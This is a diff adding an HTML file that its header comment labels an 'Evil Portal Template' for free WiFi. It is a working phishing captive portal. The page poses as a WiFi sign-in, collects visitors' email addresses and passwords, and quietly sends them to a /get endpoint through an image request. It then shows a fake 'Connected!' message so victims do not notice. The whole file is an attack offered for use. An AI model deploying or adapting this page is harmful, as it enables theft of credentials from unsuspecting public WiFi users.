@@ -1,0 +1,155 @@
+<!--
+  Evil Portal Template: Free WiFi (Generic)
+  
+  This is a clean, generic WiFi login page suitable for most scenarios.
+  
+  Form fields:
+  - email: Captured as username/email
+  - password: Captured as password
+  
+  The form submits to /get via an Image() request to avoid CORS issues.
+-->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>WiFi Login</title>
+    <style>
+        * { 
+            box-sizing: border-box; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+        }
+        body { 
+            margin: 0; 
+            padding: 20px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 400px;
+        }
+        h1 { 
+            margin: 0 0 10px 0; 
+            color: #333;
+            font-size: 28px;
+            text-align: center;
+        }
+        .subtitle {
+            color: #666;
+            text-align: center;
+            margin: 0 0 30px 0;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        input[type="email"], 
+        input[type="text"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e1e1;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #999;
+            font-size: 12px;
+        }
+        .success {
+            display: none;
+            text-align: center;
+        }
+        .success.show {
+            display: block;
+        }
+        .success h2 {
+            color: #10b981;
+            font-size: 48px;
+            margin: 0;
+        }
+        .form-container.hide {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="form-container" id="formContainer">
+            <h1>🌐 Free WiFi</h1>
+            <p class="subtitle">Sign in to connect to the internet</p>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <label>Email Address</label>
+                    <input type="email" name="email" placeholder="your@email.com" required>
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" name="password" placeholder="Enter any password" required>
+                </div>
+                <button type="submit">Connect to WiFi</button>
+            </form>
+            
+            <div class="footer">
+                By connecting, you agree to our Terms of Service
+            </div>
+        </div>
+        
+        <div class="success" id="successMsg">
+            <h2>✓</h2>
+            <h3>Connected!</h3>
+            <p>You now have internet access.</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var formData = new FormData(this);
+            var params = new URLSearchParams(formData).toString();
+            var img = new Image();
+            img.src = '/get?' + params;
+            document.getElementById('formContainer').classList.add('hide');
+            document.getElementById('successMsg').classList.add('show');
+        });
+    </script>
+</body>
+</html>
